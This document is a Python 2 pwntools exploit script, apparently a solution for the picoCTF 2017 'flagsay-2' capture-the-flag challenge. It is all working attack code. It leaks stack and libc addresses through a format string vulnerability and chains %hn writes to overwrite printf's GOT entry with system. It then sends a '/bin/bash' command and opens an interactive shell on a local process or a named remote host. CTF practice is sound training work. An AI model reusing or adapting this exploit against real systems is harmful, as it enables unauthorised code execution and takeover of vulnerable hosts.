#! /usr/bin/env python2

from pwn import *

def write_addr_payload(addr, t_lo = 9, t_hi = 53):
    global r
    global ll
    hi = addr & 0xffff0000
    lo = addr & 0x0000ffff
    hi >>= 16
    mi, w1 = (lo, t_lo) if lo <= hi else (hi, t_hi)
    ma, w2 = (lo, t_lo) if lo >  hi else (hi, t_hi)
    ma -= mi
    mi -= 2 * ll + 15
    return "%{}c%{}$hn%{}c%{}$hn".format(mi, w1, ma, w2)

def get_ptr(num):
    global r
    global end
    r.sendline("%{}$p".format(num))
    r.recvline()
    r.recvline()
    p = int(r.recvline()[15:25], 16)
    r.recvuntil(end)
    return p

def dump():
    print "$9  = {}".format(hex(get_ptr(9)))
    print "$16 = {}".format(hex(get_ptr(16)))
    print "$17 = {}".format(hex(get_ptr(17)))
    print "$53 = {}".format(hex(get_ptr(53)))

end = " //                                                     \n"
ll = len(end)

if args['REMOTE']:
    r = remote("shell2017.picoctf.com", 51857)
else:
    r = process("./flagsay-2")

# leak the target stack address
r.sendline("%9$p")
r.recvline()
r.recvline()
t1 = int(r.recvline()[15:25], 16)
t2 = t1 + 2
t3 = t1 + 4
t4 = t1 + 6
r.recvuntil(end)

print "t1 = {}".format(hex(t1))
print "t2 = {}".format(hex(t2))
print "t3 = {}".format(hex(t3))
print "t4 = {}".format(hex(t4))

# overwrite $53 using the addr from $17 to point to t2
r.sendline("%{}c%17$hn".format((t2 & 0xffff) - (2 * ll + 15)))
r.recvuntil(end)

# we can now use %9$hn to write the lower two bytes and %53$hn to write the
# higher two bytes of $16

# dump()

# leak libc so we can overwrite GOT with libc address
p_libc_start_main = 0x8049988
r.sendline(write_addr_payload(p_libc_start_main))
r.recvuntil(end)

print "leaking libc..."
# dump()

# read out libc_start_main
r.sendline("%16$s")
r.recvline()
r.recvline()
libc_start_main = u32(r.recvline()[15:19])
r.recvuntil(end)

libc_base = libc_start_main - 0x19970
system = libc_base + 0x3e3e0

print "libc_start_main = {}".format(hex(libc_start_main))
print "system          = {}".format(hex(system))

p_printf = 0x8049970

# load $16 with &$16 + 4 to write part of p_printf
r.sendline(write_addr_payload(t3))
r.recvuntil(end)

# dump()

# overwrite the low short of t1 + 4
r.sendline("%{}c%16$hn".format((p_printf & 0xffff) - (2 * ll + 15)))
r.recvuntil(end)

# load $17 with &$16 + 6 to write part of p_printf
r.sendline(write_addr_payload(t4))
r.recvuntil(end)

# dump()

# overwrite the high short of t1 + 4
r.sendline("%{}c%16$hn".format(((p_printf & 0xffff0000) >> 16) - (2 * ll + 15)))
r.recvuntil(end)

# load $17 with p_printf + 2
r.sendline(write_addr_payload(p_printf + 2))
r.recvuntil(end)

# dump()

# write system to printf@got
print "overwriting printf with system..."
r.sendline(write_addr_payload(system, 17, 16))
r.recvuntil(end)

# pwn
r.sendline("; /bin/bash #");
r.interactive()
